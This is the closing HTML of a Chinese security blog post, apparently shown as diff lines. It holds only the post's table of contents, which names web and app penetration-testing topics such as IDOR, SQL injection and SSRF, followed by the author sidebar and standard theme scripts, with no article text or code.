href="#APP%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E6%AF%94web%E5%A4%9A%E7%9A%84%E9%83%A8%E5%88%86"><span class="nav-number">6.1.</span> <span class="nav-text">APP渗透测试比web多的部分</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E7%99%BB%E5%BD%95%E6%8E%A5%E5%8F%A3%E7%9A%84%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A3"><span class="nav-number">7.</span> <span class="nav-text">登录接口的暴力破解</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E8%AE%A2%E5%8D%95%E8%B6%8A%E6%9D%83-amp-%E9%82%AE%E4%BB%B6%E5%9C%B0%E5%9D%80IDOR"><span class="nav-number">8.</span> <span class="nav-text">订单越权&amp;邮件地址IDOR</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E"><span class="nav-number">9.</span> <span class="nav-text">SQL注入漏洞</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E5%8A%A0%E5%AF%86%E7%AE%97%E6%B3%95bypass"><span class="nav-number">10.</span> <span class="nav-text">加密算法bypass</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Js-map%E6%96%87%E4%BB%B6%E5%88%B0%E8%B6%8A%E6%9D%83%E6%BC%8F%E6%B4%9E"><span class="nav-number">11.</span> <span class="nav-text">Js.map文件到越权漏洞</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E9%AA%8C%E8%AF%81%E7%A0%81%E7%BB%95%E8%BF%87%E5%88%B0%E4%BB%BB%E6%84%8F-%E6%89%8B%E6%9C%BA-x2F-%E9%82%AE%E7%AE%B1%E8%BD%B0%E7%82%B8"><span class="nav-number">12.</span> <span class="nav-text">验证码绕过到任意-手机&#x2F;邮箱轰炸</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2%E5%88%B0OSS-Bucket%E6%8E%A5%E7%AE%A1"><span class="nav-number">13.</span> <span class="nav-text">信息泄露到OSS Bucket接管</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E4%B8%8D%E4%B8%80%E6%A0%B7%E7%9A%84%E4%BB%BB%E6%84%8F%E7%94%A8%E6%88%B7"><span class="nav-number">14.</span> <span class="nav-text">不一样的任意用户</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E6%94%AF%E4%BB%98%E6%BC%8F%E6%B4%9E"><span class="nav-number">15.</span> <span class="nav-text">支付漏洞</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#SSRF-RCE"><span class="nav-number">16.</span> <span class="nav-text">SSRF+RCE</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E4%BA%8C%E6%AC%A1%E6%B3%A8%E5%85%A5%E7%BB%95%E8%BF%87"><span class="nav-number">17.</span> <span class="nav-text">二次注入绕过</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E6%9B%B4%E6%94%B9%E6%96%87%E4%BB%B6%E7%B1%BB%E5%9E%8B%E8%A7%A3%E6%9E%90"><span class="nav-number">18.</span> <span class="nav-text">更改文件类型解析</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E5%BE%AE%E4%BF%A1%E5%B0%8F%E7%A8%8B%E5%BA%8F%E5%8F%8D%E7%BC%96%E8%AF%91"><span class="nav-number">19.</span> <span class="nav-text">微信小程序反编译</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E4%BC%97%E6%B5%8B%E9%A1%B9%E7%9B%AE"><span class="nav-number">20.</span> <span class="nav-text">众测项目</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%BC%97%E6%B5%8B%E9%A1%B9%E7%9B%AE%E7%89%B9%E7%82%B9"><span class="nav-number">20.1.</span> <span class="nav-text">众测项目特点</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E9%A1%B9%E7%9B%AE%E5%88%86%E7%B1%BB"><span class="nav-number">20.2.</span> <span class="nav-text">项目分类</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%AF%BB%E6%89%BE%E5%A4%96%E5%8C%85%E7%B3%BB%E7%BB%9F"><span class="nav-number">20.3.</span> <span class="nav-text">寻找外包系统</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#hunter%E4%BD%BF%E7%94%A8%E6%8A%80%E5%B7%A7"><span class="nav-number">20.4.</span> <span class="nav-text">hunter使用技巧</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%9F%BA%E4%BA%8E%E8%B0%83%E7%94%A8hunter%E5%92%8Cfofa%EF%BC%8C%E7%9C%81%E5%8E%BB%E4%BA%86%E7%82%B9%E5%87%BBIP%E7%9A%84%E6%AD%A5%E9%AA%A4-%E5%B0%8F%E5%B7%A5%E5%85%B7"><span class="nav-number">20.5.</span> <span class="nav-text">基于调用hunter和fofa，省去了点击IP的步骤 小工具</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%8C%87%E7%BA%B9%E8%AF%86%E5%88%AB%E5%BF%AB%E9%80%9Fgetshell"><span class="nav-number">20.6.</span> <span class="nav-text">指纹识别快速getshell</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E8%AE%A2%E5%8D%95-%E6%94%AF%E4%BB%98%E6%BC%8F%E6%B4%9E"><span class="nav-number">21.</span> <span class="nav-text">订单-支付漏洞</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E6%B3%A8%E5%86%8C%E6%BC%8F%E6%B4%9E"><span class="nav-number">22.</span> <span class="nav-text">注册漏洞</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E5%88%A9%E7%94%A8%E5%8A%A0%E5%AF%86%E8%B6%8A%E6%9D%83"><span class="nav-number">23.</span> <span class="nav-text">利用加密越权</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E9%9A%90%E8%97%8F%E5%8F%82%E6%95%B0%E8%B6%8A%E6%9D%83"><span class="nav-number">24.</span> <span class="nav-text">隐藏参数越权</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#SSRF"><span class="nav-number">25.</span> <span class="nav-text">SSRF</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E9%9A%90%E8%97%8F%E6%8E%A5%E5%8F%A3%E8%B6%8A%E6%9D%83"><span class="nav-number">26.</span> <span class="nav-text">隐藏接口越权</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E5%87%8C%E9%A3%8E%E4%BA%91%E7%99%BE%E5%BA%A6%E7%BD%91%E7%9B%98"><span class="nav-number">27.</span> <span class="nav-text">凌风云百度网盘</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E7%9F%AD%E4%BF%A1%E8%BD%B0%E7%82%B8"><span class="nav-number">28.</span> <span class="nav-text">短信轰炸</span></a></li></ol></div>
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="Bron"
+      src="/images/Elaina.png">
+  <p class="site-author-name" itemprop="name">Bron</p>
+  <div class="site-description" itemprop="description">原谅我这一生不羁放纵爱自由</div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">196</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+            <a href="/categories/">
+          
+        <span class="site-state-item-count">81</span>
+        <span class="site-state-item-name">分类</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+            <a href="/tags/">
+          
+        <span class="site-state-item-count">60</span>
+        <span class="site-state-item-name">标签</span></a>
+      </div>
+  </nav>
+</div>
+  <div class="links-of-author motion-element">
+      <span class="links-of-author-item">
+        <a href="https://github.com/truthnian" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;truthnian" rel="noopener" target="_blank"><i class="fab fa-github fa-fw"></i>GitHub</a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="https://twitter.com/Elaina_Anime" title="Twitter → https:&#x2F;&#x2F;twitter.com&#x2F;Elaina_Anime" rel="noopener" target="_blank"><i class="fab fa-twitter fa-fw"></i>Twitter</a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="https://youtube.com/2CTruth" title="YouTube → https:&#x2F;&#x2F;youtube.com&#x2F;2CTruth" rel="noopener" target="_blank"><i class="fab fa-youtube fa-fw"></i>YouTube</a>
+      </span>
+  </div>
+
+
+  <div class="links-of-blogroll motion-element">
+    <div class="links-of-blogroll-title"><i class="fa fa-link fa-fw"></i>
+      Links
+    </div>
+    <ul class="links-of-blogroll-list">
+        <li class="links-of-blogroll-item">
+          <a href="https://truthnian.github.io/" title="https:&#x2F;&#x2F;truthnian.github.io" rel="noopener" target="_blank">世界上最好的网站</a>
+        </li>
+    </ul>
+  </div>
+
+      </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+        
+
+<div class="copyright">
+  
+  &copy; Thu Nov 03 2022 08:00:00 GMT+0800 (Singapore Standard Time) – 
+  <span itemprop="copyrightYear">2023</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">Bron</span>
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item-icon">
+      <i class="fa fa-chart-area"></i>
+    </span>
+      <span class="post-meta-item-text">站点总字数：</span>
+    <span title="站点总字数">675k</span>
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item-icon">
+      <i class="fa fa-coffee"></i>
+    </span>
+      <span class="post-meta-item-text">站点阅读时长 &asymp;</span>
+    <span title="站点阅读时长">10:14</span>
+</div>
+
+<!--
+  <div class="powered-by">由 <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Gemini</a> 强力驱动
+  </div>
+-->
+
+
+<div>
+<span id="timeDate">载入天数...</span><span id="times">载入时分秒...</span>
+<script>
+    var now = new Date();
+    function createtime() {
+        var grt= new Date("11/3/2022 00:00:00");
+        now.setTime(now.getTime()+250);
+        days = (now - grt ) / 1000 / 60 / 60 / 24; dnum = Math.floor(days);
+        hours = (now - grt ) / 1000 / 60 / 60 - (24 * dnum); hnum = Math.floor(hours);
+        if(String(hnum).length ==1 ){hnum = "0" + hnum;} minutes = (now - grt ) / 1000 /60 - (24 * 60 * dnum) - (60 * hnum);
+        mnum = Math.floor(minutes); if(String(mnum).length ==1 ){mnum = "0" + mnum;}
+        seconds = (now - grt ) / 1000 - (24 * 60 * 60 * dnum) - (60 * 60 * hnum) - (60 * mnum);
+        snum = Math.round(seconds); if(String(snum).length ==1 ){snum = "0" + snum;}
+        document.getElementById("timeDate").innerHTML = "本站已存活 "+dnum+" 天 ";
+        document.getElementById("times").innerHTML = hnum + " 小时 " + mnum + " 分 " + snum + " 秒";
+    }
+setInterval("createtime()",250);
+</script>
+</div>
+
+        
+<div class="busuanzi-count">
+  <script data-pjax async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+    <span class="post-meta-item" id="busuanzi_container_site_uv" style="display: none;">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-user"></i>
+      </span>
+      <span class="site-uv" title="总访客量">
+        <span id="busuanzi_value_site_uv"></span>
+      </span>
+    </span>
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item" id="busuanzi_container_site_pv" style="display: none;">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-eye"></i>
+      </span>
+      <span class="site-pv" title="总访问量">
+        <span id="busuanzi_value_site_pv"></span>
+      </span>
+    </span>
+</div>
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  <script src="/lib/anime.min.js"></script>
+  <script src="/lib/pjax/pjax.min.js"></script>
+  <script src="//cdn.jsdelivr.net/npm/jquery@3/dist/jquery.min.js"></script>
+  <script src="//cdn.jsdelivr.net/gh/fancyapps/fancybox@3/dist/jquery.fancybox.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/motion.js"></script>
+
+
+<script src="/js/schemes/pisces.js"></script>
+
+
+<script src="/js/next-boot.js"></script>
+
+<script src="/js/bookmark.js"></script>
+
+  <script>
+var pjax = new Pjax({
+  selectors: [
+    'head title',
+    '#page-configurations',
+    '.content-wrap',
+    '.post-toc-wrap',
+    '.languages',
+    '#pjax'
+  ],
+  switches: {
+    '.post-toc-wrap': Pjax.switches.innerHTML
+  },
+  analytics: false,
+  cacheBust: false,
+  scrollTo : !CONFIG.bookmark.enable
+});
+
+window.addEventListener('pjax:success', () => {
+  document.querySelectorAll('script[data-pjax], script#page-configurations, #pjax script').forEach(element => {
+    var code = element.text || element.textContent || element.innerHTML || '';
+    var parent = element.parentNode;
+    parent.removeChild(element);
+    var script = document.createElement('script');
+    if (element.id) {
+      script.id = element.id;
+    }
+    if (element.className) {
+      script.className = element.className;
+    }
+    if (element.type) {
+      script.type = element.type;
+    }
+    if (element.src) {
+      script.src = element.src;
+      // Force synchronous loading of peripheral JS.
+      script.async = false;
+    }
+    if (element.dataset.pjax !== undefined) {
+      script.dataset.pjax = '';
+    }
+    if (code !== '') {
+      script.appendChild(document.createTextNode(code));
+    }
+    parent.appendChild(script);
+  });
+  NexT.boot.refresh();
+  // Define Motion Sequence & Bootstrap Motion.
+  if (CONFIG.motion.enable) {
+    NexT.motion.integrator
+      .init()
+      .add(NexT.motion.middleWares.subMenu)
+      .add(NexT.motion.middleWares.postList)
+      .bootstrap();
+  }
+  NexT.utils.updateSidebarPosition();
+});
+</script>
+
+
+  <script defer src="/lib/three/three.min.js"></script>
+    <script defer src="/lib/three/canvas_lines.min.js"></script>
+
+
+  
+
+
+
+
+  
+<script src="/js/local-search.js"></script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+    <div id="pjax">
+  
+
+  
+<script src="https://unpkg.com/darkmode-js@1.5.7/lib/darkmode-js.min.js"></script>
+
+<script>
+var options = {
+  bottom: '64px',
+  right: 'unset',
+  left: '32px',
+  time: '0.3s',
+  mixColor: 'transparent',
+  backgroundColor: 'transparent',
+  buttonColorDark: '#FFFFE0',
+  buttonColorLight: '#00BFFF',
+  saveInCookies: true,
+  label: '🌓',
+  autoMatchOsTheme: true
+}
+const darkmode = new Darkmode(options);
+window.darkmode = darkmode;
+darkmode.showWidget();
+</script>
+<div class="moon-menu">
+  <div class="moon-menu-items">
+    
+    <div id="moon-menu-item-back2bottom" class="moon-menu-item">
+      <i class='fas fa-chevron-down'></i>    </div>
+    
+    <div id="moon-menu-item-back2top" class="moon-menu-item">
+      <i class='fas fa-chevron-up'></i>    </div>
+    
+  </div>
+  <div class="moon-menu-button">
+    <svg class="moon-menu-bg">
+      <circle class="moon-menu-cricle" cx="50%" cy="50%" r="44%"></circle>
+      <circle class="moon-menu-border" cx="50%" cy="50%" r="48%"></circle>
+    </svg>
+    <div class="moon-menu-content">
+      <div class="moon-menu-icon"><i class='fas fa-ellipsis-v'></i></div>
+      <div class="moon-menu-text"></div>
+    </div>
+  </div>
+</div><script src="/js/injector.js"></script>
+    </div>
+</body>
+</html>
+
+
